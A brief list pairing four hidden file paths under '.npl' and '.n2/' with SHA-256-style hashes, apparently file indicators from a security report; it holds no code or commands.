- `.npl`: `e246b01c998c452a2b06325a5f3912faf9532d36b8b3a32456eb07ff954f8854`
- `.n2/pay`: `db2d74499b8cd15bdfb112af200c54990098a39590ab71adc913d0d984e58015`
- `.n2/bow`: `33d5d3eb751ddcd10566d71861eba73b7f013bf78ce473b9dd36562ab2859244`
- `.n2/mlip`: `7f96262bc293097edb0225da91c6981389cdf0db488afa62619c50b3bcc64556`
